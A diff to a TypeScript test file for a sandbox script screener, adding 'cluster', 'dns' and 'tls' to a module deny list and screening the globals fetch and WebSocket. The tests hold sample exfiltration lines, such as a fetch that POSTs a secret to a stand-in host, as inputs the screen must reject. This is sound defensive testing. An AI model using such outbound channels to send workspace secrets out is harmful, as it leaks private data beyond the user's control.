@@ -22,7 +22,7 @@ import { test } from 'node:test'
 import assert from 'node:assert/strict'
 
 import {
-  FORBIDDEN_CAPABILITIES, SYNTHETIC_DIR_DEFAULT, SYNTHETIC_TEMPLATE,
+  FORBIDDEN_CAPABILITIES, FORBIDDEN_GLOBALS, SYNTHETIC_DIR_DEFAULT, SYNTHETIC_TEMPLATE,
   sandboxEntryFor, screenScript, syntheticSpec,
   type SyntheticRequest,
 } from '../src/core/synthetic.ts'
@@ -149,10 +149,59 @@ test('screenScript: the deny list is exactly the locked capability set', () => {
   // reduces through the `node:` strip, where 'process' answers for both) —
   // `import { env } from 'node:process'` used to bypass the entire
   // process.env read check.
+  // H-31: 'cluster' (fork is child_process with a friendlier name), 'dns'
+  // and 'tls' (outbound channels exactly like http; dns tunnelling is the
+  // classic covert one) joined — the screen's own charter ("make the easy
+  // exfiltration attempts fail loudly") does not survive a deny list missing
+  // the easiest channels.
   assert.deepEqual(FORBIDDEN_CAPABILITIES, [
     'child_process', 'net', 'http', 'https', 'dgram', 'worker_threads',
+    'cluster', 'dns', 'tls',
     'process', 'node:process',
   ])
+})
+
+test('H-31: cluster/dns/tls are screened like every other outbound module', () => {
+  for (const source of [
+    "import cluster from 'node:cluster'",
+    "const c = await import('cluster')",
+    "import dns from 'node:dns'",
+    "require('dns')",
+    "import tls from 'node:tls'",
+    "const t = await import('tls')",
+  ]) {
+    const { ok, findings } = screenScript(source)
+    assert.equal(ok, false, source)
+    assert.equal(findings.length > 0, true, `${source}: ${findings.join('; ')}`)
+  }
+})
+
+test('H-31: the zero-import globals (fetch, WebSocket) are screened by their call forms', () => {
+  // Node ≥ 18 ships these on the global object — no import text exists for
+  // the module screen to see, and a clean-import script could POST the
+  // workspace anywhere. The call form is the only statically visible shape.
+  for (const source of [
+    "await fetch('https://example.test', { method: 'POST', body: secret })",
+    'const r = fetch(url)',
+    "const w = new WebSocket('wss://example.test')",
+    'WebSocket(endpoint)',
+  ]) {
+    const { ok, findings } = screenScript(source)
+    assert.equal(ok, false, source)
+    assert.ok(findings.some(f => f.includes('global')), `${source}: ${findings.join('; ')}`)
+  }
+  // Boundary precision both ways: identifiers merely CONTAINING the names
+  // stay allowed (the deny-list must not teach authors to route around it).
+  for (const source of [
+    'const v = prefetch(url)',
+    'const w2 = MyWebSocket(url)',
+    "import { fetchFixture } from './fetch.mjs'",
+    'console.log("WebSocket attempts: 0")',
+  ]) {
+    assert.equal(screenScript(source).ok, true, source)
+  }
+  // The exported list is the testable contract for the globals tier.
+  assert.deepEqual(FORBIDDEN_GLOBALS, ['fetch', 'WebSocket'])
 })
 
 test('screenScript: static imports are caught, with and without the node: prefix', () => {
